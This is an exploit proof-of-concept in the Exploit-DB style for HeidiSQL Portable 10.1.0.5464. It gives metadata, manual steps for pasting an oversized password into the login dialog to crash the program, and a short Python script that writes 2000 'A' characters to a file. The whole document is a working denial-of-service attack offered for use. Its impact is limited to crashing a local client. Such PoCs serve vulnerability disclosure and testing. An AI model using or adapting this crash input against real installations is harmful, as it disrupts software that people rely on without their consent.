#Exploit Title: HeidiSQL Portable 10.1.0.5464 - Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-04-24
#Vendor Homepage: https://www.heidisql.com/
#Software Link: https://www.heidisql.com/downloads/releases/HeidiSQL_10.1_64_Portable.zip
#Tested Version: 10.1.0.5464
#Tested on: Windows 10 Single Language x64 / Windows 7 x32 Service Pack 1

#Steps to produce the crash:
#1.- Run python code: HeidiSQL_Portable_10.1.0.5464.py
#2.- Open bd_p.txt and copy content to clipboard
#2.- Open HeidiSQL
#3.- Select "New"
#4.- In Network type select "Microsoft SQL Server (TCP/IP)"
#5.- Enable "Prompt for credentials" > click on "Open"
#6.- In Login select "Password" and Paste ClipBoard
#6.- Click on "Login"
#7.- Crashed

cod = "\x41" * 2000

f = open('bd_p.txt', 'w')
f.write(cod)
f.close()